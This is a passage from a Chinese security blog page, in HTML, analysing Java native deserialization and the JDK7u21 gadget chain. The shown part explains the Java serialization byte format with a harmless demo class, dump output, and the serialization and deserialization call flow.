@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head>
+    <meta charset="utf-8">
+<title>深入 Java 原生反序列化 &amp; JDK7u21 利用链分析 - P2hm1n&#39;s Blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
+
+
+
+
+
+
+
+
+    <meta name="description" content="&amp;#x672C;&amp;#x7BC7;&amp;#x68B3;&amp;#x7406;&amp;#x4E86; Java &amp;#x539F;&amp;#x751F;&amp;#x53CD;&amp;#x5E8F;&amp;#x5217;&amp;#x5316;&amp;#x76F8;&amp;#x5173;&amp;#x77E5;&amp;#x8BC6;&amp;#xFF0C;&amp;#x540C;&amp;#x65F6;&amp;#x5206;&amp;#x6790;&amp;#x4E86; JDK 7u21&amp;#x5229;&amp;#x7528;&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="深入 Java 原生反序列化 &amp; JDK7u21 利用链分析">
+<meta property="og:url" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="P2hm1n&#39;s Blog">
+<meta property="og:description" content="&amp;#x672C;&amp;#x7BC7;&amp;#x68B3;&amp;#x7406;&amp;#x4E86; Java &amp;#x539F;&amp;#x751F;&amp;#x53CD;&amp;#x5E8F;&amp;#x5217;&amp;#x5316;&amp;#x76F8;&amp;#x5173;&amp;#x77E5;&amp;#x8BC6;&amp;#xFF0C;&amp;#x540C;&amp;#x65F6;&amp;#x5206;&amp;#x6790;&amp;#x4E86; JDK 7u21&amp;#x5229;&amp;#x7528;&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214150708996.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214151252315.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/u4inn.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/abfd01ca-62cc-4ad9-80e0-c7ce8fee9d51.png-w331s">
+<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214155858889.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210216155234182.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214172424266.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214174341040.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214175058607.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210216162034161.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210219204734743.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210220151023288.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210220160741224.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210220162047284.png">
+<meta property="article:published_time" content="2021-02-14T11:14:41.000Z">
+<meta property="article:modified_time" content="2021-02-28T10:21:05.302Z">
+<meta property="article:author" content="P2hm1n">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214150708996.png">
+
+
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                <img src="/images/logo.png" alt="" height="50">
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">Archives</a>
+            
+            <a class="navbar-item "
+               href="/categories">Categories</a>
+            
+            <a class="navbar-item "
+               href="/tags">Tags</a>
+            
+            <a class="navbar-item "
+               href="/about">About</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Suche" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Inhaltsverzeichnis">
+                    <i class="fa fa-list"></i>
+                </a>
+                <div class="navbar-dropdown is-right">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#Serialization-and-Deserialization">1&nbsp;&nbsp;<b>Serialization and Deserialization</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#JDK-7u21-Gadget-Chain">2&nbsp;&nbsp;<b>JDK 7u21 Gadget Chain</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#Basics">2.1&nbsp;&nbsp;Basics</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#Gadget-chain">2.2&nbsp;&nbsp;Gadget chain</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#FIX">2.3&nbsp;&nbsp;FIX</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#REF">3&nbsp;&nbsp;<b>REF</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" title="GitHub" href="https://github.com/P2hm1n" target="_blank" rel="noopener">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            深入 Java 原生反序列化 &amp; JDK7u21 利用链分析
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            
+                <time datetime="2021-02-14T11:14:41.000Z" itemprop="datePublished">2月 14 2021</time>
+            
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/Java-Sec/">Java Sec</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            26 分钟 lesen (Über 3911 Wörter)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <html><head></head><body><p>&#x672C;&#x7BC7;&#x68B3;&#x7406;&#x4E86; Java &#x539F;&#x751F;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#xFF0C;&#x540C;&#x65F6;&#x5206;&#x6790;&#x4E86; JDK 7u21&#x5229;&#x7528;&#x94FE;</p>
+<a id="more"></a>
+
+<h1 id="Serialization-and-Deserialization"><a href="#Serialization-and-Deserialization" class="headerlink" title="Serialization and Deserialization"></a>Serialization and Deserialization</h1><p>&#x53C2;&#x8003;&#x7F51;&#x4E0A;&#x6587;&#x7AE0;&#x68B3;&#x7406;&#x4E86;&#x4E00;&#x4E9B;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x7EC6;&#x8282;</p>
+<p><strong>Java &#x5E8F;&#x5217;&#x5316;&#x5C06;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x8F6C;&#x6362;&#x4E3A;&#x4E8C;&#x8FDB;&#x5236;&#xFF0C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5C06;&#x4E00;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x6062;&#x590D;&#x6210;&#x5BF9;&#x8C61;</strong></p>
+<p>&#x9996;&#x5148;&#x770B;&#x4E00;&#x4E0B;&#x5E8F;&#x5217;&#x5316;&#x4E4B;&#x540E;&#x5230;&#x5E95;&#x6709;&#x4EC0;&#x4E48;&#x5185;&#x5BB9;&#x88AB;&#x5199;&#x5165;&#x4E86;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;</p>
+<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SerializationDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> String stringField;</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> intField;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">SerializationDemo</span><span class="hljs-params">(String s, <span class="hljs-keyword">int</span> i)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">this</span>.stringField = s;</span><br><span class="line">        <span class="hljs-keyword">this</span>.intField = i;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>{</span><br><span class="line">        ObjectOutputStream oops = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./serializable.ser&quot;</span>));</span><br><span class="line">        oops.writeObject(<span class="hljs-keyword">new</span> SerializationDemo(<span class="hljs-string">&quot;Min&quot;</span>, <span class="hljs-keyword">new</span> Random().nextInt(<span class="hljs-number">20</span>)));</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>SerializationDumper    </p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 51 - 0x00 33</span><br><span class="line">        Value - com.p2hm1n.deserialization.basics.SerializationDemo - 0x636f6d2e7032686d316e2e646573657269616c697a6174696f6e2e6261736963732e53657269616c697a6174696f6e44656d6f</span><br><span class="line">      serialVersionUID - 0xf1 6f 46 2a 38 38 6b 46</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 2 - 0x00 02</span><br><span class="line">      Fields</span><br><span class="line">        0:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 8 - 0x00 08</span><br><span class="line">            Value - intField - 0x696e744669656c64</span><br><span class="line">        1:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 11 - 0x00 0b</span><br><span class="line">            Value - stringField - 0x737472696e674669656c64</span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - 0x74</span><br><span class="line">              newHandle 0x00 7e 00 01</span><br><span class="line">              Length - 18 - 0x00 12</span><br><span class="line">              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 02</span><br><span class="line">    classdata</span><br><span class="line">      com.p2hm1n.deserialization.basics.SerializationDemo</span><br><span class="line">        values</span><br><span class="line">          intField</span><br><span class="line">            (int)10 - 0x00 00 00 0a</span><br><span class="line">          stringField</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 03</span><br><span class="line">                Length - 3 - 0x00 03</span><br><span class="line">                Value - Min - 0x4d696e</span><br></pre></td></tr></tbody></table></figure><p></p>
+<ul>
+<li><code>0xaced</code>&#xFF0C;&#x9B54;&#x672F;&#x5934;</li>
+<li><code>0x0005</code>&#xFF0C;&#x7248;&#x672C;&#x53F7; <em>&#xFF08;JDK&#x4E3B;&#x6D41;&#x7248;&#x672C;&#x4E00;&#x81F4;&#xFF0C;&#x4E0B;&#x6587;&#x5982;&#x65E0;&#x7279;&#x6B8A;&#x6807;&#x6CE8;&#xFF0C;&#x90FD;&#x4EE5;JDK8u&#x4E3A;&#x4F8B;&#xFF09;</em></li>
+<li><code>0x73</code>&#xFF0C;&#x5BF9;&#x8C61;&#x7C7B;&#x578B;&#x6807;&#x8BC6; <em>&#xFF08;<code>0x7n</code>&#x57FA;&#x672C;&#x4E0A;&#x90FD;&#x5B9A;&#x4E49;&#x4E86;&#x7C7B;&#x578B;&#x6807;&#x8BC6;&#x7B26;&#x5E38;&#x91CF;&#xFF0C;&#x4F46;&#x4E5F;&#x8981;&#x770B;&#x51FA;&#x73B0;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x6BD5;&#x7ADF;&#x5B83;&#x4EEC;&#x90FD;&#x5728;&#x53EF;&#x89C1;&#x5B57;&#x7B26;&#x7684;&#x8303;&#x56F4;&#xFF0C;&#x8BE6;&#x89C1;<code>java.io.ObjectStreamConstants</code>&#xFF09;</em></li>
+<li><code>0x72</code>&#xFF0C;&#x7C7B;&#x63CF;&#x8FF0;&#x7B26;&#x6807;&#x8BC6;</li>
+<li><code>0x0033...</code>&#xFF0C;&#x7C7B;&#x540D;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x548C;&#x503C; <em>&#xFF08;Java&#x5E8F;&#x5217;&#x5316;&#x4E2D;&#x7684;UTF8&#x683C;&#x5F0F;&#x6807;&#x51C6;&#xFF09;</em></li>
+<li><code>0xf16f462a38386b46</code>&#xFF0C;&#x5E8F;&#x5217;&#x7248;&#x672C;&#x552F;&#x4E00;&#x6807;&#x8BC6; <em>&#xFF08;<code>serialVersionUID</code>&#xFF0C;&#x7B80;&#x79F0;SUID&#xFF09;</em></li>
+<li><code>0x02</code>&#xFF0C;&#x5BF9;&#x8C61;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x5C5E;&#x6027;&#x6807;&#x5FD7;&#x4F4D;&#xFF0C;&#x5982;&#x662F;&#x5426;&#x662F;Block Data&#x6A21;&#x5F0F;&#x3001;&#x81EA;&#x5B9A;&#x4E49;<code>writeObject()</code>&#xFF0C;<code>Serializable</code>&#x3001;<code>Externalizable</code>&#x6216;<code>Enum</code>&#x7C7B;&#x578B;&#x7B49;</li>
+<li><code>0x0002</code>&#xFF0C;&#x7C7B;&#x7684;&#x5B57;&#x6BB5;&#x4E2A;&#x6570;</li>
+<li><code>0x49</code>&#xFF0C;&#x6574;&#x6570;&#x7C7B;&#x578B;&#x7B7E;&#x540D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x540C;&#x7406;&#xFF0C;&#x4E4B;&#x540E;&#x7684;<code>0x4c</code>&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7B7E;&#x540D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x8282; <em>&#xFF08;&#x7C7B;&#x578B;&#x7B7E;&#x540D;&#x8868;&#x793A;&#x4E0E;JVM&#x89C4;&#x8303;&#x4E2D;&#x7684;&#x5B9A;&#x4E49;&#x76F8;&#x540C;&#xFF09;</em></li>
+<li><code>0x0008...</code>&#xFF0C;&#x5B57;&#x6BB5;&#x540D;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x548C;&#x503C;&#xFF0C;&#x975E;&#x539F;&#x59CB;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x8FD8;&#x4F1A;&#x5728;&#x540E;&#x9762;&#x52A0;&#x4E0A;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x6807;&#x8BC6;&#x3001;&#x5B8C;&#x6574;&#x7C7B;&#x578B;&#x7B7E;&#x540D;&#x957F;&#x5EA6;&#x548C;&#x503C;</li>
+<li><code>0x78</code> Block Data&#x7ED3;&#x675F;&#x6807;&#x8BC6;</li>
+<li><code>0x70</code> &#x7236;&#x7C7B;&#x63CF;&#x8FF0;&#x7B26;&#x6807;&#x8BC6;&#xFF0C;&#x6B64;&#x5904;&#x4E3A;<code>null</code></li>
+<li><code>0x0000000a</code> &#x6574;&#x6570;&#x5B57;&#x6BB5;<code>intField</code>&#x7684;&#x503C; <em>&#xFF08;Java&#x5E8F;&#x5217;&#x5316;&#x4E2D;&#x7684;&#x6574;&#x6570;&#x683C;&#x5F0F;&#x6807;&#x51C6;&#xFF09;</em> &#xFF0C;&#x975E;&#x539F;&#x59CB;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x5219;&#x4F1A;&#x6309;&#x5BF9;&#x8C61;&#x7684;&#x65B9;&#x5F0F;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x4E4B;&#x540E;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5B57;&#x6BB5;<code>stringField</code>&#x88AB;&#x8BC6;&#x522B;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#xFF0C;&#x8F93;&#x51FA;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x6807;&#x8BC6;&#x3001;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x548C;&#x503C;</li>
+</ul>
+<p><strong>&#x5E8F;&#x5217;&#x5316;&#x7684;&#x6267;&#x884C;&#x6D41;&#x7A0B;</strong></p>
+<ol>
+<li><code>ObjectOutputStream</code>&#x5B9E;&#x4F8B;&#x521D;&#x59CB;&#x5316;&#x65F6;&#xFF0C;&#x5C06;&#x9B54;&#x672F;&#x5934;&#x548C;&#x7248;&#x672C;&#x53F7;&#x5199;&#x5165;<code>bout</code> <em>&#xFF08;<code>BlockDataOutputStream</code>&#x7C7B;&#x578B;&#xFF09;</em> &#x4E2D;</li>
+<li>&#x8C03;&#x7528; <code>ObjectOutputStream.writeObject()</code>&#x5F00;&#x59CB;&#x5199;&#x5BF9;&#x8C61;&#x6570;&#x636E;<ul>
+<li><code>ObjectStreamClass.lookup()</code>&#x5C01;&#x88C5;&#x5F85;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x7C7B;&#x63CF;&#x8FF0; <em>&#xFF08;&#x8FD4;&#x56DE;<code>ObjectStreamClass</code>&#x7C7B;&#x578B;&#xFF09;</em> &#xFF0C;&#x83B7;&#x53D6;&#x5305;&#x62EC;&#x7C7B;&#x540D;&#x3001;&#x81EA;&#x5B9A;&#x4E49;<code>serialVersionUID</code>&#x3001;&#x53EF;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x6BB5; <em>&#xFF08;&#x8FD4;&#x56DE;<code>ObjectStreamField</code>&#x7C7B;&#x578B;&#xFF09;</em> &#x548C;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#xFF0C;&#x4EE5;&#x53CA;<code>writeObject</code>&#x3001;<code>readObject</code>&#x65B9;&#x6CD5;&#x7B49;</li>
+<li><code>writeOrdinaryObject()</code>&#x5199;&#x5165;&#x5BF9;&#x8C61;&#x6570;&#x636E;<ul>
+<li>&#x5199;&#x5165;&#x5BF9;&#x8C61;&#x7C7B;&#x578B;&#x6807;&#x8BC6;</li>
+<li><code>writeClassDesc()</code>&#x8FDB;&#x5165;&#x5206;&#x652F;<code>writeNonProxyDesc()</code>&#x5199;&#x5165;&#x7C7B;&#x63CF;&#x8FF0;&#x6570;&#x636E;<ul>
+<li>&#x5199;&#x5165;&#x7C7B;&#x63CF;&#x8FF0;&#x7B26;&#x6807;&#x8BC6;</li>
+<li>&#x5199;&#x5165;&#x7C7B;&#x540D;</li>
+<li>&#x5199;&#x5165;SUID <em>&#xFF08;&#x5F53;SUID&#x4E3A;&#x7A7A;&#x65F6;&#xFF0C;&#x4F1A;&#x8FDB;&#x884C;&#x8BA1;&#x7B97;&#x5E76;&#x8D4B;&#x503C;&#xFF0C;&#x7EC6;&#x8282;&#x89C1;&#x4E0B;&#x9762;&#x5173;&#x4E8E;SerialVersionUID&#x7AE0;&#x8282;&#xFF09;</em></li>
+<li>&#x8BA1;&#x7B97;&#x5E76;&#x5199;&#x5165;&#x5E8F;&#x5217;&#x5316;&#x5C5E;&#x6027;&#x6807;&#x5FD7;&#x4F4D;</li>
+<li>&#x5199;&#x5165;&#x5B57;&#x6BB5;&#x4FE1;&#x606F;&#x6570;&#x636E;</li>
+<li>&#x5199;&#x5165;Block Data&#x7ED3;&#x675F;&#x6807;&#x8BC6;</li>
+<li>&#x5199;&#x5165;&#x7236;&#x7C7B;&#x63CF;&#x8FF0;&#x6570;&#x636E;</li>
+</ul>
+</li>
+<li><code>writeSerialData()</code>&#x5199;&#x5165;&#x5BF9;&#x8C61;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x6570;&#x636E;<ul>
+<li>&#x82E5;&#x7C7B;&#x81EA;&#x5B9A;&#x4E49;&#x4E86;<code>writeObject()</code>&#xFF0C;&#x5219;&#x8C03;&#x7528;&#x8BE5;&#x65B9;&#x6CD5;&#x5199;&#x5BF9;&#x8C61;&#xFF0C;&#x5426;&#x5219;&#x8C03;&#x7528;<code>defaultWriteFields()</code>&#x5199;&#x5165;&#x5BF9;&#x8C61;&#x7684;&#x5B57;&#x6BB5;&#x6570;&#x636E; <em>&#xFF08;&#x82E5;&#x662F;&#x975E;&#x539F;&#x59CB;&#x7C7B;&#x578B;&#xFF0C;&#x5219;&#x9012;&#x5F52;&#x5904;&#x7406;&#x5B50;&#x5BF9;&#x8C61;&#xFF09;</em></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p><strong>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x6267;&#x884C;&#x6D41;&#x7A0B;</strong></p>
+<ol>
+<li><code>ObjectInputStream</code>&#x5B9E;&#x4F8B;&#x521D;&#x59CB;&#x5316;&#x65F6;&#xFF0C;&#x8BFB;&#x53D6;&#x9B54;&#x672F;&#x5934;&#x548C;&#x7248;&#x672C;&#x53F7;&#x8FDB;&#x884C;&#x6821;&#x9A8C;</li>
+<li>&#x8C03;&#x7528;<code>ObjectInputStream.readObject()</code>&#x5F00;&#x59CB;&#x8BFB;&#x5BF9;&#x8C61;&#x6570;&#x636E;<ul>
+<li>&#x8BFB;&#x53D6;&#x5BF9;&#x8C61;&#x7C7B;&#x578B;&#x6807;&#x8BC6;</li>
+<li><code>readOrdinaryObject()</code>&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x5BF9;&#x8C61;<ul>
+<li><code>readClassDesc()</code>&#x8BFB;&#x53D6;&#x7C7B;&#x63CF;&#x8FF0;&#x6570;&#x636E;<ul>
+<li>&#x8BFB;&#x53D6;&#x7C7B;&#x63CF;&#x8FF0;&#x7B26;&#x6807;&#x8BC6;&#xFF0C;&#x8FDB;&#x5165;&#x5206;&#x652F;<code>readNonProxyDesc()</code></li>
+<li>&#x8BFB;&#x53D6;&#x7C7B;&#x540D;</li>
+<li>&#x8BFB;&#x53D6;SUID</li>
+<li>&#x8BFB;&#x53D6;&#x5E76;&#x5206;&#x89E3;&#x5E8F;&#x5217;&#x5316;&#x5C5E;&#x6027;&#x6807;&#x5FD7;&#x4F4D;</li>
+<li>&#x8BFB;&#x53D6;&#x5B57;&#x6BB5;&#x4FE1;&#x606F;&#x6570;&#x636E;</li>
+<li><code>resolveClass()</code>&#x6839;&#x636E;&#x7C7B;&#x540D;&#x83B7;&#x53D6;&#x5F85;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x7C7B;&#x7684;<code>Class</code>&#x5BF9;&#x8C61;&#xFF0C;&#x5982;&#x679C;&#x83B7;&#x53D6;&#x5931;&gt; &#x8D25;&#xFF0C;&#x5219;&#x629B;&#x51FA;<code>ClassNotFoundException</code></li>
+<li><code>skipCustomData()</code>&#x5FAA;&#x73AF;&#x8BFB;&#x53D6;&#x5B57;&#x8282;&#x76F4;&#x5230;Block Data&#x7ED3;&#x675F;&#x6807;&#x8BC6;&#x4E3A;&#x6B62;</li>
+<li>&#x8BFB;&#x53D6;&#x7236;&#x7C7B;&#x63CF;&#x8FF0;&#x6570;&#x636E;</li>
+<li><code>initNonProxy()</code>&#x4E2D;&#x5224;&#x65AD;&#x5BF9;&#x8C61;&#x4E0E;&#x672C;&#x5730;&#x5BF9;&#x8C61;&#x7684;SUID&#x548C;&#x7C7B;&#x540D; <em>&#xFF08;&#x4E0D;&#x542B;&#x5305;&#x540D;&#xFF09;</em> &#x662F;&#x5426;&#x76F8;&#x540C;&#xFF0C;&#x82E5;&#x4E0D;&#x540C;&#xFF0C;&#x5219;&#x629B;&#x51FA;<code>InvalidClassException</code></li>
+</ul>
+</li>
